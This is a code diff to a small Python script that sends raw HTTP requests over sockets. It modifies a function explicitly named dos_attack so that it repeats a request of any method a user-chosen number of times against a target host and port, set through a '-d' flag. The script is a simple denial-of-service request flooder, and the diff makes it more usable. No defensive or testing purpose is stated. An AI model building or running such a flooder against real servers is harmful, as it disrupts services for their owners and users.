@@ -3,6 +3,7 @@ import sys
 import socket
 import os
 
+# Function to send HTTP requests
 def send_request(host, port, filename, command, options=None):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
@@ -61,11 +62,11 @@ def send_request(host, port, filename, command, options=None):
 
     s.close()
 
-
-def dos_attack(host, port, filename, count):
+# DOS Attack Function
+def dos_attack(host, port, filename, command, count):
     for i in range(count):
         print(f"Sending request #{i+1}")
-        send_request(host, port, filename, "GET")
+        send_request(host, port, filename, command)
 
 
 if __name__ == "__main__":
@@ -78,8 +79,13 @@ if __name__ == "__main__":
     filename = sys.argv[3]
     command = sys.argv[4]
 
-    if len(sys.argv) == 6 and sys.argv[5].startswith("-d"):
-        count = int(sys.argv[5][3:])
-        dos_attack(host, port, filename, count)
+    dos_count = None
+    if "-d" in sys.argv:
+        d_index = sys.argv.index("-d")
+        if d_index + 1 < len(sys.argv):
+            dos_count = int(sys.argv[d_index + 1])
+        
+    if dos_count:
+        dos_attack(host, port, filename, command, dos_count)
     else:
         send_request(host, port, filename, command)
